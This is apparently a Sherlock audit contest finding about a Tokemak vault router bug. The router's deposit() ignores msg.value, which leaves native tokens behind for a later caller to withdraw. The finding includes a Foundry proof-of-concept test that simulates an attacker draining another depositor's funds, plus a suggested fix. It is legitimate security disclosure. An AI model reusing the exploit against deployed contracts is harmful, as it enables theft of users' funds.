# Original link
https://github.com/sherlock-audit/2023-06-tokemak-judging/issues/344
0xbepresent

high

# An attacker can steal `native` token from the `LMPVaultRouterBase` contract due `LMPVaultRouterBase::deposit()` malfunction
## Summary

The `LMPVaultRouterBase::deposit()` function does not manage correctly the `nativeToken` AND `baseToken` deposits causing an attacker the opportunity to steal native token from the LMPVaultRouterBase.

## Vulnerability Detail

The [LMPVaultRouterBase::deposit()](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L44) helps to deposit to the `LMPVault`. It accepts [native token value](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L51) and the [vault asset](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L54).

The problem is that the user may send both, the native token AND the vault base asset in the same transaction call but the function will deposit to the `LMPVault` only the amount specified in the [amount](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L47) parameter. Therefore, an attacker can steal the amount not used by the `LMPVault`.

The deposit function execution:

- The [_processEthIn()](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L51) function will [deposit the `msg.value`](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L120) in the `LMPVaultRouterBase` contract.
- The [pullToken()](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L54) will [transfer the `vaultAsset`](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/utils/PeripheryPayments.sol#L54) from the caller to the `LMPVaultRouterBase` contract.
- Then, the [deposited amount to the `LMPVault`](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L67) will be the value specified in `amount` parameter. **The error is here because the deposit to the `LMPVault` does not count the `msg.value` amount.**

I created the next test where at the end, an attacker can steal native token amount from the `LMPVaultRouterBase` contract.

1. A depositor calls `deposit()` function sending `1e18 nativeToken` and `1e18 baseAssetToken`.
2. The `lmpVault` increases the `totalAssets` by `1e18` which is incorrect because the totalAssets should be increased by 2e18 because the depositor balance was decreased 1e18 baseAsset and 1e18 nativeToken (2e18).
3. Attacker deposits `1e18` baseAsset and then withdraw their assets. At the end the attacker will have `2e18` native token. The attacker steal `1e18` from the depositor of the step one.


```solidity
// File: LMPVaultRouter.t.sol
// $ forge test --match-test "test_depositEthAndWethError" -vvv
    function test_depositEthAndWethError() public {
        // An attacker can steal value from the LMPVaultRouter.
        // The deposit() function does not manage correctly the nativeToken AND baseToken deposits
        // causing an attacker to steal native token from the LMPVaultRouter.
        //
        // depositAmount = 1e18;
        uint256 minSharesExpected = 1;
        uint256 baseAssetBefore = baseAsset.balanceOf(address(this));
        uint256 nativeTokenBefore = address(this).balance;
        uint256 vaultTotalAssetsBefore = lmpVault.totalAssets();
        baseAsset.approve(address(lmpVaultRouter), depositAmount);
        //
        // User calls deposit() sending 1e18 nativeToken and 1e18 baseAssetToken.
        uint256 sharesReceived = lmpVaultRouter.deposit{value: depositAmount}(
            lmpVault,
            address(this),
            depositAmount,
            minSharesExpected);
        assertGt(sharesReceived, 0);
        //
        // The depositor's baseAsset balance decreased 1e18 amount.
        assertEq(baseAsset.balanceOf(address(this)), baseAssetBefore - depositAmount);
        //
        // Also the depositor's nativeToken balance decreased 1e18 amount.
        assertEq(address(this).balance, nativeTokenBefore - depositAmount);
        //
        // The lmpVault asset is increased by only 1e18 amount which is incorrect
        // because the user balance was decreased the baseAsset and the nativeToken balance.
        assertEq(lmpVault.totalAssets(), vaultTotalAssetsBefore + depositAmount);
        //
        // An attacker can deposit 1e18 then withdraw the unused amount from the first depositor.
        // The attacker will receive his 1e18 weth deposited amount + 1e18 nativeToken.
        address attacker = address(369);
        vm.startPrank(attacker);
        deal(address(baseAsset), attacker, 1e18); // attacker has 1e18
        baseAsset.approve(address(lmpVaultRouter), 1e18);
        lmpVaultRouter.deposit(lmpVault, attacker, 1e18, minSharesExpected); // attacker deposits 1e18
        lmpVault.approve(address(lmpVaultRouter), 1e18);
        lmpVaultRouter.withdraw(lmpVault, attacker, 1e18, 1e18, true);
        //
        // Attacker balance is 2e18 nativeToken. The attacker steal 1e18.
        assertEq(attacker.balance, 2e18);
        vm.stopPrank();
    }
```

## Impact

An attacker can steal unused `weth/native` from the LMPVaultRouterBase contract. Material loss at zero cost by the attacker.

## Code Snippet

The [LMPVaultRouterBase.deposit()](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L44) function:

```solidity
    function deposit(
        ILMPVault vault,
        address to,
        uint256 amount,
        uint256 minSharesOut
    ) public payable virtual override returns (uint256 sharesOut) {
        // handle possible eth
        _processEthIn(vault);

        IERC20 vaultAsset = IERC20(vault.asset());
        pullToken(vaultAsset, amount, address(this));

        return _deposit(vault, to, amount, minSharesOut);
    }
```

The [LMPVaultRouterBase._processEthIn()](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L111C14-L111C27) function:

```solidity
    function _processEthIn(ILMPVault vault) internal {
        // if any eth sent, wrap it first
        if (msg.value > 0) {
            // if asset is not weth, revert
            if (address(vault.asset()) != address(weth9)) {
                revert InvalidAsset();
            }

            // wrap eth
            weth9.deposit{ value: msg.value }();
        }
    }

```

## Tool used

Manual review

## Recommendation

The [deposit()](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L56) function must count the `msg.value` amount. So the deposited amount to the `LMPVault` must be the `baseAssetAmount` + the `msg.value` amount.

```diff
    function deposit(
        ILMPVault vault,
        address to,
        uint256 amount,
        uint256 minSharesOut
    ) public payable virtual override returns (uint256 sharesOut) {
        // handle possible eth
        _processEthIn(vault);

        IERC20 vaultAsset = IERC20(vault.asset());
        pullToken(vaultAsset, amount, address(this));

--      return _deposit(vault, to, amount, minSharesOut);
++      return _deposit(vault, to, amount + msg.value, minSharesOut);
    }
```

Duplicate of #1
